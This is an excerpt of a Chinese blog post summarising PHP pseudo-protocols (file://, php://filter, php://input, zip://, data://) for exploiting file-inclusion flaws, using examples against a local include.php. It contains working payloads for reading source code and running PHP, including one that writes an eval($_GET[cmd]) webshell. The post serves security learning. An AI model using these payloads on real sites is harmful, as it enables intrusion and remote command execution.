...
*   **示例**：
    ...
    1.  `file://[文件的绝对路径和文件名]`
        ...
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/001.png)
        
    2.  `[文件的相对路径和文件名]`
        
        http://127.0.0.1/include.php?file=./phpinfo.txt
        
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/002.png)
        
    3.  `[http：//网络路径和文件名]`
        
        http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
        
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/003.png)
...
*   **可用的过滤器列表（4类）**
    ...
    此处列举主要的过滤器类型，详细内容请参考：[https://www.php.net/manual/zh/filters.php](https://link.segmentfault.com/?enc=QlRiSsx67LjMSPipa8lYEQ%3D%3D.PKkUW2HFWctFFzfH2ac9yTPtyKYdWSdy4R4f6APxHdYdjF5JSFASf9EoNH1Sgwok)
    ...
    | string.strip\_tags | 等同于`strip_tags()`，去除html、PHP语言标签 |
...
*   **示例**：
    ...
    1.  `php://filter/read=convert.base64-encode/resource=[文件名]`读取文件源码（针对php文件需要base64编码）
        ...
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/004.png)
        
    2.  `php://input + [POST DATA]`执行php代码
        
        http://127.0.0.1/include.php?file=php://input \[POST DATA部分\] <?php phpinfo(); ?>
        
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/005.png)
        
        若有写入权限，写入一句话木马
        
        http://127.0.0.1/include.php?file=php://input \[POST DATA部分\] <?php fputs(fopen('1juhua.php','w'),'<?php @eval($\_GET\[cmd\]); ?>'); ?>
        
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/006.png)
...
*   **示例**：
    ...
    1.  `zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）
        ...
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/007.png)
    ...
    2.  `compress.bzip2://file.bz2`
        ...
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/008.png)
    ...
    3.  `compress.zlib://file.gz`
        ...
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/009.png)
...
*   **示例**：
    ...
    1.  `data://text/plain,`
        ...
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/010.png)
        
    2.  `data://text/plain;base64,`
        
        http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
        
        ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/011.png)
...
*   **示例**：
    ...
    ![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/012.png)
...
![](/images/posts/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/013.png)

另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：**phar://协议对象注入技术**。

因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。

> 原文：[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)
